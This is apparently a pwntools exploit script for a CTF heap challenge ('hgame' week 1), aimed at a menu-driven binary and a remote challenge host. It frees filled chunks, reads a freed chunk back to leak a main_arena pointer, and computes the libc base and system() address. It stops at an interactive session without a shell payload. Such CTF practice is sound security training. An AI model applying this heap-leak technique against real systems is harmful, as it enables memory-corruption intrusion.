from pwn import * 
from pwn import p64


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect(host,30709)#远程连接
    gdb_is =0

if gdb_is:
    gdb.attach(r,'*b 0x4012ed')
    pause()
    pass

libc = ELF('./libc-2.31.so')
elf = ELF('./vuln')

def add(page,size,content):
    r.sendlineafter(b'Exit',b'1')
    r.sendlineafter(b'Index:', str(page).encode())
    r.sendlineafter(b'Size:', str(size).encode())
    r.sendafter(b'Content: ',content)

def delete(page):
    r.sendlineafter(b'Exit',b'2')
    r.sendlineafter(b'Index:', str(page).encode())

def show(page):
    r.sendlineafter(b'Exit',b'3')
    r.sendlineafter(b'Index:', str(page).encode())

for i in range(9):
    add(i,0x80,b'0')
for i in range(8):
    delete(i)

show(7)
main_arena_addr = u64(r.recvuntil(b'1.')[1:-3].ljust(8,b'\x00')) 
print(f'main_arena_addr = {hex(main_arena_addr)}')
libc_addr = main_arena_addr - 0x1ecbe0
libc.address = libc_addr
system_addr = libc.sym['system']


print(f'libc_addr = {hex(libc_addr)}')
print(f'system_addr = {hex(system_addr)}')

# r.sendlineafter()
# r.send()
# r.recvuntil()
r.interactive()
